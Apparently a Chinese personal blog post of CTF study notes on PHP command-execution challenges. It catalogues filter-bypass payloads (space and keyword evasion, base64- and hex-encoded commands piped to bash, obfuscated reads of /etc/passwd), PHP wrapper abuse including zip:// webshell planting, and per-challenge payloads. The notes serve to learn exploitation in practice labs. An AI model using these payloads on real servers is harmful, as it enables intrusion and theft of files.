<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctf-web命令执行 | Gizz's BLOG</title><meta name="author" content="Gizz"><meta name="copyright" content="Gizz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web命令执行常用绕过方式:https:&#x2F;&#x2F;blog.csdn.net&#x2F;2301_76690905&#x2F;article&#x2F;details&#x2F;134533626常用函数（至少记住每个函数的两点1、有没有回显2、参数怎么放） system：语法为system(string $command, int &amp;$return var &#x3D; ?)，command: 执行 command 参数所指定的命令">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf-web命令执行">
<meta property="og:url" content="http://example.com/2024/08/31/ctf-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="Gizz&#39;s BLOG">
<meta property="og:description" content="web命令执行常用绕过方式:https:&#x2F;&#x2F;blog.csdn.net&#x2F;2301_76690905&#x2F;article&#x2F;details&#x2F;134533626常用函数（至少记住每个函数的两点1、有没有回显2、参数怎么放） system：语法为system(string $command, int &amp;$return var &#x3D; ?)，command: 执行 command 参数所指定的命令">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/%E5%A4%B4%E5%83%8F.png">
<meta property="article:published_time" content="2024-08-31T13:57:44.000Z">
<meta property="article:modified_time" content="2024-09-12T07:03:44.602Z">
<meta property="article:author" content="Gizz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/%E5%A4%B4%E5%83%8F.png"><link rel="shortcut icon" href="/image/%E5%9B%BE%E6%A0%87.png"><link rel="canonical" href="http://example.com/2024/08/31/ctf-web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ctf-web命令执行',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-12 15:03:44'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/image/%E5%A4%B4%E5%83%8F.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/top.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Gizz's BLOG"><img class="site-icon" src="/image/R-C.gif"/><span class="site-name">Gizz's BLOG</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctf-web命令执行</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-31T13:57:44.000Z" title="发表于 2024-08-31 21:57:44">2024-08-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-12T07:03:44.602Z" title="更新于 2024-09-12 15:03:44">2024-09-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctf-web命令执行"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="web命令执行"><a href="#web命令执行" class="headerlink" title="web命令执行"></a>web命令执行</h2><h3 id="常用绕过方式-https-blog-csdn-net-2301-76690905-article-details-134533626"><a href="#常用绕过方式-https-blog-csdn-net-2301-76690905-article-details-134533626" class="headerlink" title="常用绕过方式:https://blog.csdn.net/2301_76690905/article/details/134533626"></a>常用绕过方式:<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_76690905/article/details/134533626">https://blog.csdn.net/2301_76690905/article/details/134533626</a></h3><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>（至少记住每个函数的两点1、有没有回显2、参数怎么放）</p>
<p>system：语法为system(string $command, int &amp;$return var &#x3D; ?)，command: 执行 command 参数所指定的命令常用参数并且输出执行结果，如果提供 return var 参数，则外部命令执行后的返回状态将会被设置到此变量中。示例：system（’ls’）会直接返回当前文件下的目录。该函数提交命令自己回显</p>
<p>exec：示例exec(“cat &#x2F;flag”)，其本身没有回显</p>
<p>passthru（读取二进制流）：system()的平替，写个命令就会执行命令，自己能回显</p>
<p>shell_exec和反引号&#96;&#96;:格式分别为shell_exec（ls）和<code>ls</code>,不能自己回显，需要借用echo\print等输出结果</p>
<p>popen:语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式’r’表示阅读，’w’ 表示写入。不能自己回显，需要print_r等输出内容</p>
<p>proc_popen:语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options),</p>
<p>$command是要执行的命令。<br>$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。<br>$pipes是一个引用变量，用于存储与进程相关的管道。<br>$cwd（可选）是设置子进程的当前工作目录。<br>$env（可选）是设置子进程的环境变量。<br>$other_options（可选）是其他选项，如设置超时等。<br>pcntl_exec:语法格式为pcntl exec(string $path, array $args &#x3D; ?, array $envs &#x3D; ?)<br>path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。<br>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key &#x3D;&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</p>
<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><blockquote>
<p>&lt;&lt;&gt;<code>重定向符</code></p>
<p>%09<code>(需要php环境) </code></p>
<p>${IFS}</p>
<p>$IFS$9</p>
<p>{cat,flag.php}<code>//用逗号实现了空格功能</code></p>
<p>%20</p>
<p>%09</p>
</blockquote>
<h4 id="文件名绕过"><a href="#文件名绕过" class="headerlink" title="文件名绕过"></a>文件名绕过</h4><p>1、??,<em>绕过<br>passthru代替system，过滤flag文件名用?，</em>绕过</p>
<p>cat &#x2F;fl??</p>
<p>cat &#x2F;f*  #多个匹配结果同时展现</p>
<p>以上指令等效于cat &#x2F;flag</p>
<p>2、单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则<br>cat &#x2F;fl””ag</p>
<p>c””at &#x2F;e’t’c&#x2F;pas<code>s</code>wd </p>
<p>对php来说这是fl””ag而不是flag关键字不会匹配上，但是对于linux系统来说cat &#x2F;fl””ag等效于cat &#x2F;flag。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
<p>passthru(‘cat &#x2F;fl””ag.p&#39;&#39;hp’)</p>
<p>3、反斜杠\绕过<br>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<p>cat fl\ag.p\hp</p>
<p> 4、特殊变量：$1到$9、$@和$*<br>这些特殊变量输出为空</p>
<p>cat &#x2F;fl$9ag</p>
<p>cat &#x2F;fl$@ag</p>
<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
<p>c$@at &#x2F;e$@tc&#x2F;pas$@swd</p>
<p>cat$x &#x2F;etc$x&#x2F;passwd$x</p>
<p>ca$@t &#x2F;etc$x&#x2F;passwd$x</p>
<p> 5、内联执行绕过<br>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
<p>6、利用linux中的环境变量<br>使用环境变量里的字符执行变量</p>
<p>echo $PATH              #PATH默认系统环境变量</p>
<p>如果出现：</p>
<p>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;snap&#x2F;bin</p>
<p>echo f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}<br>表示了flag.php</p>
<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字flag.php</p>
<h4 id="读取命令绕过"><a href="#读取命令绕过" class="headerlink" title="读取命令绕过"></a>读取命令绕过</h4><p>1、base64编码：<br>cat flag.php–&gt; Y2FOIGZSYWcucGhw<br>echo Y2FOIGZsYWcucGhw | base64 -d<br>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
<p>执行命令的话有三种形式：</p>
<p>echo Y2FOIGZsYWcucGhw | base64 -d | bash</p>
<p>$(echo Y2FOIGZsYWcucGhw | base64 -d)</p>
<p><code>echo Y2FOIGZsYWcucGhw | base64 -d</code>   #反引号</p>
<p> 把cat flag.php，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
<p>2、base32编码同理<br>?cmd&#x3D;system(‘echo “MNQXIIDGNRQWOLTQNBYA&#x3D;&#x3D;&#x3D;&#x3D;”|base32 -d|&#x2F;bin&#x2F;bash’);</p>
<p>3、HEX编码（ASCII编码）<br>python脚本</p>
<p>import binascii<br>s &#x3D; b”tac flag”<br>h &#x3D; binascii.b2a_hex(s)<br>print(h)<br>tac flag–&gt; 74616320666c6167</p>
<p>echo “74616320666c6167”|xxd -r -p|bash</p>
<p>xxd: 二进制显示和处理文件工具。<br>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
<p>?cmd&#x3D;passthru(‘echo “74616320666c6167”|xxd -r -p|bash’);</p>
<p>4、shellcode编码（16进制的机器码）<br>?cmd&#x3D;passthru(‘printf”\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”|bash’);</p>
<p>?cmd&#x3D;passthru(‘<code>printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;</code>‘);</p>
<p>?cmd&#x3D;passthru(‘$(printf”\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70”)’);</p>
<p>1、tac:反向显示，从最后一行开始往前显示<br>tac &#x2F;flag</p>
<p>2、more:一页一页显示档案内容<br>more flag.php</p>
<p>3、less：与more类似<br>4、tail：查看末尾几行<br>5、nl：显示的时候，顺便输出行号<br>nl &#x2F;flag</p>
<p>nl &#x2F;flag 和 nl flag 是不同的。</p>
<p>在 Linux 系统中，nl 命令用于给文件添加行号。当使用 nl &#x2F;flag 命令时，&#x2F;flag 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 nl &#x2F;flag 将会给该文件的内容添加行号。</p>
<p>而当使用 nl flag 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，nl flag 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
<p>6、od：以二进制方式读取档案内容。正常的od &#x2F;flag输出的纯纯二进制<br>想看到文件内容需要：</p>
<p>passthru(“od -A d -c &#x2F;fla\g”);</p>
<p>7、xxd：读取二进制文件<br>xxd &#x2F;flag</p>
<p>8、sort：主要用于排序文件<br>so?t &#x2F;flag</p>
<p>&#x2F;usr&#x2F;bin&#x2F;s?rt &#x2F;flag </p>
<p>&#x2F;usr&#x2F;bin&#x2F;sort 和 sort 实际上是同一个命令。&#x2F;usr&#x2F;bin 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 &#x2F;usr&#x2F;bin 目录中,因此&#x2F;usr&#x2F;bin&#x2F;sort &#x2F;flag 和 sort &#x2F;flag 是等价的。有时候sort不行可能&#x2F;usr&#x2F;bin&#x2F;s?rt可以</p>
<p>9、uniq：报告或删除文件中重复的行，其实当成cat用就行<br>10、file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</p>
<p>11、grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</p>
<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
<p>12、strings：<br>相当于cat</p>
<h4 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h4><h4 id="读取文件函数"><a href="#读取文件函数" class="headerlink" title="读取文件函数"></a>读取文件函数</h4><pre><code>读取文件函数：
file_get_contents()：将整个文件读入一个字符串（PHP4&gt;=4.3.0,PHP5,PHP7,PHP8）
exp:c=echo file_get_contents(&quot;flag.php&quot;);

file():把整个文件读入一个数组中(PHP4,PHP5,PHP7,PHP8)
readfile():读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回FALSE并附带错误信息。您可以通过在函数名前面添加一个‘@’来隐藏错误输出。
exp:c=readfile(&quot;flag.php&quot;);

var_dump():输出变量的类型和值。它可以输出多种类型的变量，包括数字、字符串、数组、对象等。
exp:c=var_dump(file(&#39;flag.php&#39;));

highlight_file():对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。
exp:c=highlight_file(&quot;flag.php&quot;);

show_source():用于返回突出显示PHP语法的文件,通过使用HTML标记突出显示语法。
exp:c=show_source(&quot;flag.php&quot;);

feof():函数检测是否已达到文件末尾（eof）。如果文件指针到了EOF或者出错时则反回TRUE，否则返回一个错误（包括socket超时），其它情况则返回FALSE。
exp:
</code></pre>
<p>c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgets($a);echo $line;}		#一行一行读取</p>
<pre><code>fgetcsv():从文件指针中读入一行并解析CSV字段，与fgets()类似，不同的是fgetcsv()解析读入的行并找出CSV格式的字段，然后返回一个包含这些字段的数组。fgetcsv()出错时反馈FALSE，包括碰到文件结束时。
exp:
</code></pre>
<p>c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetc($a);echo $line;}		#一行一个一个字符取<br>c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetcsv($a);var_dump($line);}<br>————————————————</p>
<p>1）include文件包含绕过</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">c</span>=include<span class="variable">$_POST</span>[<span class="number">1</span>]<span class="comment">;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>（2）show_source或hightlight_file展示源代码，file_get_contents()文件读取</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show_source</span></span><br><span class="line">c=show_source(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//highlight_file</span></span><br><span class="line">c=highlight_file(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件读取，源码看flag</span></span><br><span class="line">c=<span class="function">echo <span class="title">file_get_contents</span>(<span class="params"><span class="string">&quot;flag.php&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure>

<p>（3）无参数函数</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="name">next</span>(<span class="name">array_reverse</span>(<span class="name">scandir</span>(<span class="name">current</span>(<span class="name">localeconv</span>())))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p><em>#注当输入payload页面没有回显时，可通过查看源代码的方式得到flag</em> </p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><img src="/../images/90acace50e7ed16ac0bc388fb0c1c489-17251127028991.png" alt="img"></p>
<p>在实战中php伪协议配合文件包含漏洞可以发挥重大作用，比如读取文件源码，任意命令执行，或者开启后门获取webshell。常见的伪协议有</p>
<blockquote>
<ul>
<li>php:&#x2F;&#x2F;filter 读取文件源码</li>
<li>php:&#x2F;&#x2F;input 任意代码执行</li>
<li>data:&#x2F;&#x2F;text&#x2F;plain 任意代码执行</li>
<li>zip:&#x2F;&#x2F; 配合文件上传开启后门</li>
</ul>
</blockquote>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter:"></a>php:&#x2F;&#x2F;filter:</h4><p>php:&#x2F;&#x2F;filter 协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码。</p>
<p>使用文件包含函数包含文件时,文件中的代码会被执行,如果想要读取文件源码,可以使用base64对文件内容进行编码,编码后的文件内容不会被执行,而是展示在页面中,我们将页面中的内容使用base64解码,就可以获取文件的源码了。</p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input:"></a>php:&#x2F;&#x2F;input:</h4><p>可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行,需要注意的是,当enctype&#x3D;multipart&#x2F;form-data时,php:&#x2F;input将会无效。</p>
<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain:"></a>data:&#x2F;&#x2F;text&#x2F;plain:</h4><p>写法：data:&#x2F;&#x2F;text&#x2F;plain, 或 data:&#x2F;&#x2F;text&#x2F;plain;base64,</p>
<p>协议格式: data:资源类型;编码,内容</p>
<p>data:&#x2F;&#x2F;协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行.</p>
<p>include （或 require）语句会获取指定文件中存在的所有文本&#x2F;代码&#x2F;标记，并复制到使用 include 语句的文件中。<br>伪协议中的<code>data://</code>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</p>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;:"></a>zip:&#x2F;&#x2F;:</h4><p>ziip:&#x2F;&#x2F;协议用来读取压缩包中的文件,可以配合文件上传开启后门,获取webshell</p>
<p>将shell.txt压缩成zip,再将后缀名改为jpg上传至服务器,再通过zip伪协议访问压缩包里的文件,从而链接木马</p>
<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>这里用正则表达式过滤了flag</p>
<p>可以用system(‘tac f*’) 读取所有f开头文件的内容</p>
<p><img src="/../images/image-20240802110420088-17251127029002.png" alt="image-20240802110420088"></p>
<p><img src="/../images/image-20240802110547031-17251127029004.png" alt="image-20240802110547031"></p>
<p><img src="/../images/image-20240802110632361-17251127029003.png" alt="image-20240802110632361"></p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>这次过滤了flag system php</p>
<p>可以用其他命令执行函数  <strong>命令执行函数：<code>passthru、shell_exec、exec</code></strong> 或者使用反引号&#96;&#96;反引号里面的内容会被当做shell来执行</p>
<p><img src="/../images/image-20240802161249076-17251127029006.png" alt="image-20240802161249076"></p>
<p><img src="/../images/image-20240802161359360-17251127029005.png" alt="image-20240802161359360"></p>
<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>这次的正则又匹配了空格 cat等</p>
<p>这里可以使用空格绕过 使用空格url编码形式?c&#x3D;echo ( <code>tac%09f*</code>);</p>
<p>或者使用&amp;连接两个命令c&#x3D;eval($_GET[cmd]);&amp;cmd&#x3D;system(“tac f*”);</p>
<p><img src="/../images/image-20240802172020726-17251127029007.png" alt="image-20240802172020726"></p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p>这次又增加了一些过滤条件</p>
<p>过滤了括号 所以可以使用include函数 加上php伪协议 省去括号</p>
<p>用&gt;?代替分号</p>
<p><img src="/../images/image-20240802180306743-17251127029008.png" alt="image-20240802180306743"></p>
<p><img src="/../images/image-20240802180517644-17251127029009.png" alt="image-20240802180517644"></p>
<h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>这里就是又多过滤了一个双引号 解法同上</p>
<p><img src="/../images/image-20240802182020965-172511270290010.png" alt="image-20240802182020965"></p>
<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>与33类似</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>增加了过滤&lt;和&#x3D;  相同的解法即可</p>
<p>或者采用data协议</p>
<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>这里过滤掉了数字 没法用file伪协议  用data就行 思路同上</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>这里直接就给我们了文件包含 直接用就行</p>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;palin,<?php system("tac f*");?></p>
<p><img src="/../images/image-20240803224013333-172511270290011.png" alt="image-20240803224013333"></p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>这里过滤了php 所以我们在写payload的时候 将php标签换成别的形式就行  <strong>短标签<code>‘&lt;?=’</code>是PHP的一个短的开放式标签</strong></p>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;palin,<?=system("tac f*");?> </p>
<p><img src="/../images/image-20240803224505738-172511270290012.png" alt="image-20240803224505738"></p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><p>这里强行加了.php的后缀</p>
<p>但是我们这里正常进行文件包含就行</p>
<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac fla*.php");?>  因为php语句已经执行完毕了 后面的.php不会对我们的语句有影响</p>
<p><img src="/../images/image-20240803230347067-172511270290013.png" alt="image-20240803230347067"></p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p>这题禁用了很多符号  再用上述思路没办法了</p>
<p>这里有个新的方法 无参数读取文件</p>
<p>就是只利用函数 通过套娃完成读取文件</p>
<p>无参数的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数</p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br>current() 函数返回数组中的当前元素（单元）,默认取第一个值，<br>pos() 同 current() ,是current()的别名<br>reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE<br>array_reverse()：数组逆序<br>array_flip()是交换数组的键和值<br>?c&#x3D;print_r(show_source(array_rand(array_flip(scandir(pos(localeconv()))))));<br>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));<br>next()： 函数将内部指针指向数组中的下一个元素，并输出。<br>?c&#x3D;print_r(scandir(current(localeconv())));<br>scandir(current(localeconv())) 查看当前目录所有文件名<br>?c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
